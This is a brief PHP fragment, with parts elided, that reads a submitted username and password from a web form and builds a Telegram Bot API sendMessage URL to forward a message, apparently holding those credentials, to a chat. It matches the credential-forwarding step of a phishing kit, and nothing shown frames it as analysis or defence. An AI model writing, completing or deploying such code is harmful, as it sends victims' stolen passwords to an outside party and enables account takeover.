...
$correo = $_POST['nombre']; // Nombre de usuario
$contraseña = $_POST['cl']; // Contraseña
...
$telegram_url = "https://api.telegram.org/bot" . $bot_api_key . 
                "/sendMessage?chat_id=" . $chat_id . 
                "&text=" . urlencode($mensaje_para_chatbot);
